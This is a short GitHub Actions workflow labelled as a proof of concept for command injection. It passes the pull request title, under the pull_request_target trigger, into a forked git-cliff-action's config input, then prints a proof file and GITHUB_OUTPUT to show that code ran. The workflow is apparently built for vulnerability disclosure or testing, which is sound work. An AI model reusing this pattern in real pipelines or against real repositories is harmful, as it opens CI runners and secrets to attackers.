name: poc-command-injection

on:
  pull_request_target:
    types: [opened, edited, synchronize]

permissions:
  contents: read
  pull-requests: read

jobs:
  changelog:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Run vulnerable action
        uses: psbhck-png/git-cliff-action@11ab60a12325cc82a96afbf3fb3907481e27ab96
        with:
          config: ${{ github.event.pull_request.title }}
          args: -v
        continue-on-error: true

      - name: Show proof
        run: |
          echo "=== PROOF FILE ==="
          cat "$RUNNER_TEMP/zd_git_cliff_action_rce_proof" || echo "file not found"
          echo "=== ENV CHECK ==="
          cat "$GITHUB_OUTPUT" || echo "no output"
